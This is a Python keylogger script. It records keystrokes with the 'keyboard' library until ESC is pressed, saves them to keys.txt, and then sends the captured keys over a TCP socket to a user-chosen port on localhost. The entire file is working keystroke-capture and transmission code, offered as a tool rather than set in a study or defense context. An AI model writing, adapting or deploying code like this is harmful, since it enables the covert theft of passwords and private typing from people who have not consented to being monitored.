#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import keyboard
import socket
import threading
import os

def send_keys_to_server(port):
    """Send recorded keys to the specified listening port."""
    server_address = ('localhost', port)
    
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        try:
            sock.connect(server_address)
            print(f"Connected to server on port {port}. Sending keys...")
            with open("keys.txt", "r") as file:
                data = file.read()
                sock.sendall(data.encode())
            print("Keys sent successfully.")
        except Exception as e:
            print(f"Could not connect to server: {e}")

def keylogger():
    """Record keystrokes to a file."""
    FILE_NAME = "keys.txt"
    
    # Clear previous logs if they exist
    if os.path.exists(FILE_NAME):
        os.remove(FILE_NAME)

    print("Keylogger started. Press ESC to stop.")
    
    with open(FILE_NAME, "a") as output:
        keyboard.start_recording()
        keyboard.wait('esc')  # Stop on pressing ESC
        recorded_events = keyboard.stop_recording()
        
        for event in recorded_events:
            if event.event_type == keyboard.KEY_DOWN:  # Log only key down events
                output.write(event.name + '\n')
    
    print(f"Keys logged in {FILE_NAME}")
    return FILE_NAME

def main():
    """Main function to run the keylogger."""
    port = int(input("Enter the listening port: "))
    
    keylogger_thread = threading.Thread(target=keylogger)
    sender_thread = threading.Thread(target=send_keys_to_server, args=(port,))
    
    keylogger_thread.start()
    keylogger_thread.join()  # Wait for keylogger to finish
    
    # Send keys after the logging is complete
    sender_thread.start()
    sender_thread.join()

if __name__ == "__main__":
    main()
